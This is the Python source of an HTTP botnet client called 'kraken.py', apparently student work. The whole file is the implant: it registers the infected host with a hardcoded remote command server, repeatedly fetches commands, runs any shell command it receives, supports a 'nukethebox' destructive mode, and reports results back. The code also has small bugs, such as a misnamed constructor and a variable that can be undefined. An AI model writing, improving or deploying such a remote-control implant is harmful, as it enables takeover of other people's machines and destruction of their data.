#!/usr/bin/env python3
# Amanda Brown (aeb6590) 
# kraken.py (HTTP bot) 

# import necessary libraries 
import json
import socket
import requests
import subprocess
import time
import string
import random 


# Define the bot 
class Bot:
    def _init_(self,uuid):
        self.uuid = uuid

# Execute a passed in shell command 
def shellExec(command): 
    subprocess.call(command)

# Execute the passed in nuke command
def nuke(command):
    subprocess.call(command)

# Figure the bot's sleep time
def sleepTime(ret):
    sleepTime = 3
    if ret != 200: 
        sleepTime = 300
    return sleepTime

# Get a random 64 letter uuid for the bot
def getUUID():
    chars = string.ascii_letters
    uuid = ''.join(random.choice(chars) for i in range(64))
    return uuid

# Execute the program
def main():

    status = 0
    
    # Instantiate the bot and give it a uuid 
    kraken = Bot()
    kraken.uuid = getUUID()

    host = socket.gethostname() 
    server = 'http://129.21.115.114:8080'
    
    # Send the bot info to the server
    botInfo = {'uuid':kraken.uuid, 'interval':5, 'interval_delta':5, 'server':server,'hostname':host, 'interface':'eth0'}
    
    # Keep attempting to connect
    while (status != 200):
        register = requests.post(server + '/register', botInfo)
        status = register.status_code
        time.sleep(5)

    # Keep looping for commands 
    while (True):
        cmd = requests.get(server + '/getcommand')
        cmd = cmd.text
        parsedCmd = json.loads(cmd)
        
        # If server replies with shell execution command
        if parsedCmd.get("mode") == "shell":
            resp = shellExec(parsedCmd.get("params"))
        
        # If server replies with nuke the box command 
        if parsedCmd.get("mode") == "nukethebox": 
            resp = nuke(parsedCmd.get("params"))
        
        botSend = {'uuid':kraken.uuid,'uaid':parsedCmd.get("uaid"), 'error':0, 'resp':resp}
        ret = requests.post(server,botSend)
        
        # Time to sleep 
        TTS = sleepTime(ret.status_code) 
        time.sleep(TTS)

main()
